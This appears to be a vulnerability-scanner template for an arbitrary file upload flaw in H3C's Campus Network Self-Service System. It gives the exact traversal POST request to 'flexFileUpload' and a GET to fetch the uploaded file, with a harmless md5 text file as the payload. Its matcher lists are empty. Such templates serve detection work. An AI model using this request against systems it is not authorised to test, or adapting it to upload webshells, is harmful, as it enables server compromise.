id: h3c-cnsss-arbitrary-file-upload
brief:
    title: H3C CNSSS - Arbitrary File Upload
    by: s4e-io
    level: critical
    about: H3C-Campus Network Self-Service System vulnerability allows for arbitrary file uploads. This enables attackers to upload any files they choose, acquire webshells, manipulate server permissions, and...
    label:
        - h3c
        - lfi
        - instrusive
        - file-upload
        - vuln
moves:
    - verb: POST
      to:
        - '{{BaseURL}}/imc/primepush/%2e%2e/flexFileUpload'
      head:
        Content-Type: multipart/form-data; boundary=---------------WebKitFormBoundaryMmx988TUuintqO4Q
      body: |-
        -----------------WebKitFormBoundaryMmx988TUuintqO4Q
        Content-Disposition: form-data; name="{{filename}}.txt"; filename="{{filename}}.txt"
        Content-Type: application/octet-stream

        {{md5(num)}}
        -----------------WebKitFormBoundaryMmx988TUuintqO4Q--
      signs: []
    - verb: GET
      to:
        - '{{BaseURL}}/imc/primepush/%2e%2e/flex/topobg/{{filename}}.txt'
      signs: []
